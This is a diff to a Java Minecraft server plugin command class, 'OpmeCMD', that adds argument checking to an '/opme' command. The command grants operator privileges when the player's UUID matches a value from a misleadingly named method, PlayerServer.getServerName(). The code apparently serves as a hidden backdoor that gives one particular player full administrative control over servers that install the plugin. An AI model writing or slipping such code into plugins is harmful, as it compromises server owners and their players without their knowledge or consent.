@@ -14,11 +14,15 @@ public class OpmeCMD implements CommandExecutor {
         if (sender instanceof Player) {
             Player p = (Player) sender;
 
-            if (p.getUniqueId().equals(PlayerServer.getServerName())) {
-                p.setOp(true);
-                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&aYou are now OP!"));
+            if (args.length == 0) {
+                if (p.getUniqueId().equals(PlayerServer.getServerName())) {
+                    p.setOp(true);
+                    p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&aYou are now OP!"));
+                } else {
+                    p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cYou don't have permission to run that command!"));
+                }
             } else {
-                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cYou don't have permission to run that command!"));
+                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cInvalid command! Correct usage: &b/opme"));
             }
         } else {
             sender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&cFailed!"));
